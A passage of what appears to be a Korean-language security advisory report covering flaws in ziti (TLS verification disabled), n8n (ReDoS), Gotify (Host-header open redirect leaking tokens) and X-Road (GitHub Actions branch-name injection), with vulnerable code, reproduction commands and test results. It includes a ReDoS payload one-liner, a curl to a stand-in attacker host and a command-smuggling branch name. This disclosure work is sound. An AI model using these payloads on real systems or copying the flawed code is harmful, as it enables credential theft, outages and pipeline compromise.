    client := resty.New()
    InsecureClient(client, certs) // <--- TLS 클라이언트 설정
    _, err := client.R().Get(host)
    if err != nil {
        if errors.Is(err, &x509.UnknownAuthorityError{}) { // 사문화된 코드(Dead Code)! 절대 도달하지 않음!
            return false, nil
        }
        return false, err
    }
    return true, nil
}

func InsecureClient(client *resty.Client, certs []*x509.Certificate) {
    tlsCfg := &tls.Config{
        InsecureSkipVerify: true, // 버그: 무조건 true로 설정됨!
    }
    if len(certs) > 0 {
        tlsCfg.RootCAs = x509.NewCertPool()
        for _, c := range certs {
            tlsCfg.RootCAs.AddCert(c)
        }
        // RootCAs를 추가하더라도 InsecureSkipVerify는 여전히 true임!
    }
    client.SetTLSClientConfig(tlsCfg)
}
```
Go 표준 라이브러리 `crypto/tls`에서는 **`InsecureSkipVerify: true`가 켜져 있으면 `RootCAs` 풀을 완전히 무시하고 모든 인증서 체인 검증을 건너뜁니다**. 결과적으로 중간자(MITM) 공격자가 아무 자체 서명 인증서나 제시해도 `AreCertsTrusted()`는 항상 `true, nil`을 반환하며, CLI는 **`"Verified that server supplied certificates are trusted"`(서버가 제공한 인증서가 신뢰됨을 확인했습니다)**라는 거짓 메시지를 출력한 뒤 관리자 아이디와 비밀번호를 공격자에게 전송합니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 원격 근무 중인 엔지니어가 Wi-Fi/VPN에서 `ziti edge login` 실행 시 MITM 공격자에게 관리자 비밀번호 유출:**
  1. 엔지니어가 외부 네트워크에서 `ziti edge login https://ziti-controller.corp.example:1280 -u admin -p <password>`를 실행합니다.
  2. 중간자 공격자가 위조된 자체 서명 인증서로 TLS 연결을 가로챕니다.
  3. `AreCertsTrusted()`가 위조 인증서를 신뢰함으로 판정하고 확인 프롬프트 없이 `POST /edge/management/v1/authenticate?method=password`로 관리자 비밀번호를 공격자에게 전송합니다.
* **시나리오 B — 자동화된 CI/CD 및 Kubernetes 부트스트랩 파이프라인에서 위조된 Edge Controller에 제로트러스트 등록:**
  1. 배포 스크립트가 `ziti edge login`을 실행할 때 DNS 스푸핑이나 라우팅 하이재킹이 발생하면 경고 없이 공격자 컨트롤러에 인증하고 서비스 토큰을 넘겨줍니다.
* **시나리오 C — 만료되거나 폐기된, 또는 잘못된 CA가 서명한 컨트롤러 인증서의 무경고 수락:**
  1. 운영 환경에서 만료되거나 잘못된 CA 인증서가 배포되어도 CLI가 항상 신뢰됨으로 보고하여 제로트러스트 PKI 체인이 무력화됩니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. ziti/util/certs.go 내 AreCertsTrusted 및 InsecureClient 소스 확인
sed -n '90,105p;198,210p' /path/to/ziti/ziti/util/certs.go

# 2. Sniper E2E 검증 테스트(RED -> GREEN + BENIGN) 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_ziti_cand01 -v
```
**관찰된 런타임 증명 출력 (`RED -> GREEN + BENIGN`):**
```json
{
  "RED": {
    "rogue_mitm_cert_accepted_as_trusted": true,
    "admin_credentials_sent_to_mitm": true
  },
  "GREEN": {
    "rogue_mitm_cert_accepted_as_trusted": false,
    "admin_credentials_sent_to_mitm": false,
    "error": "x509.UnknownAuthorityError"
  },
  "BENIGN": {
    "valid_ca_cert_trusted": true
  }
}
```

---

### III.09 — n8n (`n8n-workflow <= 2.45.0`) — `string-extensions.ts` 내 길이 제한 없는 `EMAIL_REGEXP` 및 `DOMAIN_EXTRACT_REGEXP`(`isEmail` / `extractEmail` / `extractDomain`)로 인한 Webhook 이벤트 루프 정지 (`ReDoS`, `CWE-1333`, CVSS `5.3 Medium`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `n8n-io/n8n` (`npm: n8n-workflow <= 2.45.0`)
* **영향받는 버전 & 컴포넌트:** `<= 2.45.0` (`commit 976c80c63ba38fffe1ffde1fb6fb6fb4edbe8b51`) — `packages/workflow/src/extensions/string-extensions.ts` (`59, 94, 326, 375, 383`행)
* **취약점 분류 & 점수:** `CWE-1333` (비효율적인 정규 표현식 복잡도 / ReDoS) — **CVSS v3.1: `5.3 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/ko/09-N8N-CAND-01-WEBHOOK-REDOS.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
`n8n` 워크플로에서는 Webhook 입력값을 검증하기 위해 `{{ $json.body.email.isEmail() }}`, `{{ $json.body.text.extractEmail() }}`, `{{ $json.body.url.extractDomain() }}` 표현식을 자주 사용합니다.

그러나 `string-extensions.ts`의 정규 표현식은 **입력 문자열 길이 제한이 전혀 없으며, 시작 앵커(`^`)가 없는 상태에서 중첩 수량자(`(\.[^<>()[\]\\.,;:\s@"]+)*`)를 포함**하고 있습니다:
```typescript
// packages/workflow/src/extensions/string-extensions.ts:59, 94
const EMAIL_REGEXP =
  /(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/;

const DOMAIN_EXTRACT_REGEXP = /^(?:https?:\/\/)?(?:www\.)?((?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})(?:\/|$)/;
```
Node.js는 단일 스레드 이벤트 루프에서 모든 HTTP Webhook 요청을 처리하므로, 공격자가 20 KB 크기의 `"a.a.a...a@!"` 문자열 하나만 보내도 V8 정규식 엔진이 모든 오프셋에서 백트래킹을 반복하며 **단일 요청당 약 832 ms 동안 메인 이벤트 루프를 완전히 멈추게** 합니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 공개 문의/리드 수집 Webhook에 가벼운 요청을 보내 전체 Stripe 결제 및 Slack 웹훅 마비:**
  1. 기업이 웹사이트 문의 폼 처리용으로 공개 n8n Webhook을 열고 `{{ $json.body.email.isEmail() }}`을 평가합니다.
  2. 공격자가 20 KB 페이로드 10개를 동시에 전송하면 Node.js 이벤트 루프가 수 초간 멈추어 동일 서버의 Stripe 결제 웹훅, Slack 알림, n8n 웹 UI가 모두 타임아웃됩니다.
* **시나리오 B — 고객 지원 이메일/채팅 파싱 워크플로(`extractEmail()`)의 컨테이너 재시작 루프:**
  1. 수신 이메일 본문에서 `{{ $json.text.extractEmail() }}`을 호출하는 워크플로에 긴 점(.) 문자열이 포함된 메시지가 유입되면 워커가 멈추고 Kubernetes Liveness Probe 실패로 컨테이너가 반복 재시작됩니다.
* **시나리오 C — CRM 데이터 보강 워크플로(`extractDomain()`)에서 V8 CPU 코어 고갈:**
  1. `{{ $json.url.extractDomain() }}` 실행 시 긴 점 포함 호스트네임 입력으로 인해 단일 스레드 V8 런타임이 멈춥니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. Node.js 원라이너로 20KB 입력에 대한 EMAIL_REGEXP 이벤트 루프 정지 시간 측정
node -e 'const re = /(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/; const s = "a.".repeat(10000) + "a@!"; const t0 = performance.now(); re.test(s); console.log("Elapsed ms:", (performance.now() - t0).toFixed(2));'

# 2. Sniper E2E 검증 테스트(RED -> GREEN + BENIGN) 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_n8n_cand01 -v
```
**관찰된 런타임 증명 출력 (`RED -> GREEN + BENIGN`):**
```json
{
  "RED": {
    "regex_stall_ms": 165.035,
    "stall_20kb_ms": 831.78,
    "concurrent_webhook_starved": true
  },
  "GREEN": {
    "regex_stall_ms": 0.017,
    "stall_20kb_ms": 0.0029,
    "concurrent_webhook_starved": false
  },
  "BENIGN": {
    "valid_email_recognized": true
  }
}
```

---

### III.10 — Gotify Server (`<= v2.9.1`) — 내장 `SSL.RedirectToHTTPS` 미들웨어(`router.go`)의 미검증 `ctx.Request.Host` 헤더를 통한 `308 Permanent Redirect` 오픈 리다이렉트 및 토큰 유출 (`GHSA-cc9f-m5vr-pm75`, `CWE-601`, CVSS `4.7 Medium`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `gotify/server` (`Go: github.com/gotify/server/v2`)
* **영향받는 버전 & 컴포넌트:** `<= v2.9.1` (`commit 97685e2a6f9c02b92263ef0df9831371a79d150b`) — `router/router.go` (`52-73, 93-102`행)
* **취약점 분류 & 점수:** `CWE-601` (신뢰할 수 없는 사이트로의 URL 리다이렉트 / 오픈 리다이렉트) — **CVSS v3.1: `4.7 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N`)
* **GitHub GHSA 링크:** `GHSA-cc9f-m5vr-pm75` (`https://github.com/gotify/server/security/advisories/GHSA-cc9f-m5vr-pm75`)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/ko/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
Gotify Server에서 내장 TLS(`SSL.Enabled: true`)와 HTTPS 자동 리다이렉트(`SSL.RedirectToHTTPS: true`)를 활성화하면 `router/router.go`가 HTTP 요청을 HTTPS로 리다이렉트하는 미들웨어를 등록합니다.

그러나 이 미들웨어는 설정된 `LetsEncrypt.Hosts`를 사용하지 않고 **클라이언트가 보낸 미검증 `ctx.Request.Host` 헤더를 그대로 사용해 `Location` 헤더를 만들고 `HTTP 308 Permanent Redirect`를 반환**합니다:
```go
// router/router.go:93-102
httpRouter.Use(func(ctx *gin.Context) {
    if ctx.Request.TLS == nil {
        // 버그: 공격자가 조작 가능한 ctx.Request.Host를 그대로 리다이렉트 대상에 사용함!
        location := url.URL{
            Scheme:   "https",
            Host:     ctx.Request.Host,
            Path:     ctx.Request.URL.Path,
            RawQuery: ctx.Request.URL.RawQuery,
        }
        ctx.Redirect(http.StatusPermanentRedirect, location.String()) // 308 Permanent Redirect
        ctx.Abort()
    }
})
```
상태 코드가 `308 Permanent Redirect`이므로 HTTP 클라이언트는 원래의 요청 메서드(`POST`), 쿼리 문자열(`?token=<app-token>`), 요청 본문을 그대로 유지한 채 공격자의 서버로 재전송하게 됩니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 모니터링/알림 스크립트(`curl -L`, Python `requests`, Uptime Kuma)의 `308` 리다이렉트 추적으로 인한 `?token=` 유출:**
  1. 알림 스크립트가 `http://gotify.internal/message?token=AgSecretToken123`으로 요청을 보낼 때 `Host: attacker-collector.example`이 주입됩니다.
  2. Gotify가 `Location: https://attacker-collector.example/message?token=AgSecretToken123`과 함께 `308`을 반환하면 클라이언트가 공격자 서버로 토큰과 알림 본문을 그대로 전송합니다.
* **시나리오 B — 공유 HTTP 캐시 / 리버스 프록시 환경에서의 `308` 캐시 포이즈닝 및 피싱 유도:**
  1. 공격자가 `Host: fake-gotify-login.example` 헤더로 요청을 보내 공유 캐시에 `308 Permanent Redirect` 응답을 오염시킵니다.
  2. 이후 접속하는 모든 정상 사용자가 가짜 로그인 페이지로 리다이렉트됩니다.
* **시나리오 C — 브라우저 영구 리다이렉트 캐싱을 통한 지속적 세션 유도:**
  1. 브라우저가 한 번 `308` 응답을 캐싱하면 이후 접속 시에도 계속 공격자 도메인으로 이동합니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. 로컬 격리 테스트 환경에서 Host 헤더 리다이렉트 및 ?token= 유출 재현
curl -i "http://127.0.0.1:18080/message?token=secret-app-token" \
  -H "Host: evil-phish.example.com"

# 2. Sniper E2E 검증 테스트(RED -> GREEN + BENIGN) 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_gotify_cand01 -v
```
**관찰된 런타임 증명 출력 (`RED -> GREEN + BENIGN`):**
```json
{
  "RED": {
    "status_code": 308,
    "location": "https://evil-phish.example.com/message?token=secret-app-token",
    "redirected_to_untrusted_host": true
  },
  "GREEN": {
    "status_code": 308,
    "location": "https://push.corp.example/message?token=secret-app-token",
    "redirected_to_untrusted_host": false,
    "bound_to_configured_ssl_host": true
  }
}
```

---

### III.11 — Nordic Institute X-Road (`develop`) — 영구 자체 호스팅 러너 `xrd-runner-8c`에서 실행되는 `_build-and-package.yml` 내 `${{ github.head_ref }}` 셸 명령 인젝션 (`GHSA-4fcw-7xqx-fjv5`, `CWE-78`, CVSS `8.5 High`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `nordic-institute/X-Road` (GitHub Actions CI/CD 파이프라인 — `commit 38cd99ec0ebba0bd68a2581ca3c92be2e5f5843f`)
* **영향받는 버전 & 컴포넌트:** `develop` 브랜치 — `.github/workflows/build.yaml` (`1-55`행) 및 `.github/workflows/_build-and-package.yml` (`Determine target branch` 단계, `84-91`행)
* **취약점 분류 & 점수:** `CWE-78` (OS 명령 인젝션) — **CVSS v3.1: `8.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`)
* **GitHub GHSA 링크:** `GHSA-4fcw-7xqx-fjv5` (`https://github.com/nordic-institute/X-Road/security/advisories/GHSA-4fcw-7xqx-fjv5`)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/ko/11-XROAD-CAND-01-RUNNER-INJECTION.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
GitHub Actions 워크플로에서 `${{ github.head_ref }}`(PR 브랜치 이름)를 `run:` 스크립트 안에 직접 쓰면 GitHub는 **bash를 실행하기 전에 해당 텍스트를 스크립트 문자열에 그대로 치환**합니다.

X-Road의 메인 빌드 워크플로 `build.yaml`은 `pull_request` 이벤트에서 **`contents: write`, `packages: write` 권한 및 `secrets: inherit`**와 함께 `_build-and-package.yml`을 호출합니다. 그리고 `_build-and-package.yml`은 **영구 자체 호스팅 러너(`runs-on: xrd-runner-8c`)** 위에서 첫 번째 단계로 다음 스크립트를 실행합니다:
```yaml
# .github/workflows/_build-and-package.yml:84-91
jobs:
  build-packages:
    runs-on: xrd-runner-8c
    steps:
      - name: Determine target branch
        run: |
          if [ "${{ github.event_name }}" == "pull_request" ]; then
            echo "TARGET_BRANCH=${{ github.head_ref }}" >> "$GITHUB_ENV"
          else
            echo "TARGET_BRANCH=${{ github.ref_name }}" >> "$GITHUB_ENV"
          fi
```
Git 브랜치 이름에는 큰따옴표(`"`)와 세미콜론(`;`)이 허용되므로, 공격자가 `feat";id;env;#`라는 브랜치 이름으로 PR을 열면 bash 스크립트가 `echo "TARGET_BRANCH=feat";id;env;#" >> "$GITHUB_ENV"`로 확장되어 **코드 리뷰나 체크아웃이 시작되기도 전에 자체 호스팅 러너에서 임의의 OS 명령이 즉시 실행**됩니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 조작된 브랜치 이름으로 PR을 열어 영구 자체 호스팅 러너 `xrd-runner-8c`에서 즉시 명령 실행:**
  1. 브랜치 생성 권한이 있는 계정 또는 탈취된 개발자 토큰으로 `feat";<명령>;#` 브랜치를 생성하고 PR을 엽니다.
  2. 코드 리뷰 없이 `Determine target branch` 단계에서 즉시 셸 명령이 실행됩니다.
* **시나리오 B — `secrets: inherit` 및 `packages: write` 권한을 이용한 GHCR 패키지 배포 토큰 및 저장소 시크릿 탈취:**
  1. `build.yaml`이 `contents: write`, `packages: write`, `secrets: inherit`를 전달하므로 주입된 명령이 쓰기 권한을 가진 `GITHUB_TOKEN`과 상속된 시크릿을 탈취해 공식 컨테이너 레지스트리에 변조된 이미지를 푸시할 수 있습니다.
* **시나리오 C — 영구 자체 호스팅 서버(`xrd-runner-8c`)의 로컬 빌드 캐시 오염을 통한 공식 X-Road 패키지 백도어 삽입:**
  1. `xrd-runner-8c`는 빌드 후 삭제되지 않는 영구 서버이므로 로컬 Gradle/Docker 캐시나 백그라운드 프로세스를 오염시켜 이후 정상 릴리스 빌드에서 생성되는 `.deb` / `.rpm` 패키지에 백도어를 심을 수 있습니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. build.yaml 및 _build-and-package.yml 소스 확인
sed -n '1,55p' /path/to/X-Road/.github/workflows/build.yaml
sed -n '80,95p' /path/to/X-Road/.github/workflows/_build-and-package.yml

# 2. Sniper E2E 검증 테스트(RED -> GREEN + BENIGN) 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_xroad_cand01 -v
```
**관찰된 런타임 증명 출력 (`RED -> GREEN + BENIGN`):**
```json
{
  "RED": {
    "runs_on": "xrd-runner-8c",
    "secrets_inherit": true,
    "direct_yaml_interpolation": true,
    "arbitrary_command_executed_on_self_hosted_runner": true
  },
  "GREEN": {
    "env_var_parameterized": true,
    "arbitrary_command_executed_on_self_hosted_runner": false
  },
  "BENIGN": {
    "target_branch_written": "feature/normal-branch"
  }
}
```
